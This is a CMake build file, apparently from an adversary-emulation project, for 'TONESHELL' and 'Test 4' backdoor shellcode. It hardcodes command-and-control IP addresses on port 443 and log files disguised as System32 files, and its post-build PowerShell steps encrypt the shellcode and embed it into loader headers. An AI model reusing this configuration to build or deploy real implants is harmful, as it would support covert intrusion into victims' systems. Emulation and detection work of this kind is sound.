###############################################################################
# TONESHELL AND TEST 4 SHELLCODE
###############################################################################

# Defines TONESHELL shellcode
add_pic(
    shellcode
    entry.cpp
    shellcode.hpp
    ""
    comms.cpp
    comms_encryption_det.cpp
    exec.cpp
    shellcode_util.cpp
    shellcode_util_id_d.cpp
    "${CMAKE_SOURCE_DIR}/src/common/logger.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_aes_ctr.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_base64.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/util.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/xor.cpp"
)

# Defines Test 4 shellcode
add_pic(
    test4shellcode
    entry.cpp
    test4shellcode.hpp
    ""
    comms.cpp
    comms_encryption_test4.cpp
    exec.cpp
    rc4.cpp
    shellcode_util.cpp
    shellcode_util_id_p.cpp
    "${CMAKE_SOURCE_DIR}/src/common/logger.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_aes_ctr.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/pi_base64.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/util.cpp"
    "${CMAKE_SOURCE_DIR}/src/common/xor.cpp"
)

target_include_directories(
    shellcode-pe
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/shellcode"
    "${CMAKE_SOURCE_DIR}/src/common"
)

target_include_directories(
    test4shellcode-pe
    PUBLIC
    "${CMAKE_SOURCE_DIR}/src/shellcode"
    "${CMAKE_SOURCE_DIR}/src/common"
)

target_compile_definitions(
    shellcode-pe
    PRIVATE
    SERVER="191.44.44.199"
    PORT=443
    SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\wsdapi_dat.log"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)

target_compile_definitions(
    test4shellcode-pe
    PRIVATE
    SERVER="191.44.44.224"
    PORT=443
    SH_LOG_FILE="C:\\\\Windows\\\\System32\\\\gflagsui_dat.log"
    ENCRYPTED_LOGGING=1 # set to 0 to disable, set to non-0 to enable
)

# Encrypt and embed TONESHELL shellcode in header
add_custom_command(
    TARGET shellcode-pe
    PRE_BUILD
    COMMAND
        cmake -E remove "${CMAKE_SOURCE_DIR}/src/wsdapi/embedded.hpp"
    COMMENT "Clean previously generated embedded.hpp file"
)
add_custom_command(
    TARGET shellcode-pe
    POST_BUILD
    COMMAND
        powershell.exe -File "${CMAKE_SOURCE_DIR}/src/common/embed_payload.ps1" -Template "${CMAKE_SOURCE_DIR}/src/common/embedded.hpp.in" -InputFile "$<TARGET_FILE_DIR:shellcode-pe>/shellcode.bin" -OutputFile "${CMAKE_SOURCE_DIR}/src/wsdapi/embedded.hpp" -EmbedNamespace "embedded"
    COMMENT "Generating header with embedded shellcode and encryption key"
)

# Encrypt and embed test 4 shellcode in header
add_custom_command(
    TARGET test4shellcode-pe
    PRE_BUILD
    COMMAND
        cmake -E remove "${CMAKE_SOURCE_DIR}/src/test4/gflagsui/t4embedded.hpp"
    COMMENT "Clean previously generated t4embedded.hpp file"
)
add_custom_command(
    TARGET test4shellcode-pe
    POST_BUILD
    COMMAND
        powershell.exe -File "${CMAKE_SOURCE_DIR}/src/common/embed_payload.ps1" -Template "${CMAKE_SOURCE_DIR}/src/common/embedded.hpp.in" -InputFile "$<TARGET_FILE_DIR:test4shellcode-pe>/test4shellcode.bin" -OutputFile "${CMAKE_SOURCE_DIR}/src/test4/gflagsui/t4embedded.hpp" -EmbedNamespace "embedded"
    COMMENT "Generating header with embedded test 4 shellcode and encryption key"
)
